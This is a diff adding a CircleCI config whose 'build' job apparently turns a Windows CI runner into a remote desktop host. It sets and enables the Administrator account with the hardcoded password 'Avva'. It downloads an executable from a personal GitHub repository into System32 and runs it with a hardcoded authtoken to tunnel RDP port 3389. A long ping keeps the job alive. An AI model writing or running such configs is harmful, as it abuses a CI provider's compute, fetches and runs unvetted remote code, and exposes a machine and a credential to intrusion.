@@ -1,0 +1,21 @@
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - checkout      
+      - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Avva" -Force)
+      - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser 
+      - run: Invoke-WebRequest https://raw.githubusercontent.com/Aseem0xff/Theia/main/theia.exe -OutFile theia.exe
+      - run: Copy theia.exe C:\Windows\System32
+      - run: cmd /c echo ./theia.exe authtoken "2R9ifOukZ71Nh13p6HBWuZxfsIH_5PcT34d21Z5h7L3JdRTKS" >a.ps1
+      - run: cmd /c echo cmd /k start theia.exe tcp 3389 >>a.ps1
+      - run: cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
+      - run: .\a.ps1
